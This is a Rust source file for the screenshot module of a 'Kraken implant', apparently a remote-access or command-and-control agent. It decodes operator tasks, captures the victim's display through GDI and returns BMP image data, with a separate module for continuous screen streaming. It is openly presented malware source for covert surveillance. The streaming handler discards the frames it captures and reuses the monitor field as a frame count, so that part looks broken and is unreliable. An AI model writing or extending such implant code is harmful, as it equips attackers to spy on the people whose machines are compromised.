//! mod-screenshot: Screen capture module for Kraken implant
//!
//! Captures a screenshot of the primary display and returns BMP-encoded
//! image data along with dimensions and capture timestamp.
//!
//! Windows: implemented via GDI (GetDC / BitBlt / GetDIBits).
//! Linux/macOS: returns a "not implemented" error (stub).

use common::{KrakenError, Module, ModuleId, ScreenshotOutput, TaskId, TaskResult};
use prost::Message;
use protocol::ScreenshotTask;

mod capture;
mod encode;
pub mod streaming;

pub struct ScreenshotModule {
    id: ModuleId,
}

impl ScreenshotModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("screenshot"),
        }
    }
}

impl Default for ScreenshotModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for ScreenshotModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Screenshot"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: ScreenshotTask = ScreenshotTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let monitor_index = task.monitor.unwrap_or(0);

        let frame = capture::capture(monitor_index)?;
        let bmp_data = encode::encode_bmp(&frame)?;

        // Capture timestamp: seconds since Unix epoch.
        let captured_at = {
            use std::time::{SystemTime, UNIX_EPOCH};
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0)
        };

        Ok(TaskResult::Screenshot(ScreenshotOutput {
            data: bmp_data,
            width: frame.width,
            height: frame.height,
            format: "bmp".into(),
            monitor_index: frame.monitor_index,
            captured_at,
        }))
    }
}

/// Module for continuous screenshot streaming
pub struct ScreenshotStreamModule {
    id: ModuleId,
}

impl ScreenshotStreamModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("screenshot_stream"),
        }
    }
}

impl Default for ScreenshotStreamModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for ScreenshotStreamModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Screenshot Streaming"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: protocol::ScreenshotTask = protocol::ScreenshotTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let config = streaming::StreamConfig {
            interval_ms: 1000,
            quality: 50,
            max_frames: task.monitor.unwrap_or(10),
        };
        let frames = streaming::capture_stream(&config)?;
        let _ = frames;
        Ok(TaskResult::Success)
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(ScreenshotModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = ScreenshotModule::new();
        assert_eq!(module.id().as_str(), "screenshot");
        assert_eq!(module.name(), "Screenshot");
    }

    #[test]
    fn test_stream_module_id() {
        let module = ScreenshotStreamModule::new();
        assert_eq!(module.id().as_str(), "screenshot_stream");
        assert_eq!(module.name(), "Screenshot Streaming");
    }

    #[test]
    fn test_handle_invalid_data() {
        let module = ScreenshotModule::new();
        let task_id = TaskId::new();
        // Garbage bytes → protocol error
        let result = module.handle(task_id, b"not valid protobuf garbage!!");
        // Should either succeed (empty task decoded) or return a protocol error.
        // An empty protobuf message (all-optional fields) decodes fine, so we
        // only check that garbage doesn't panic.
        let _ = result;
    }
}
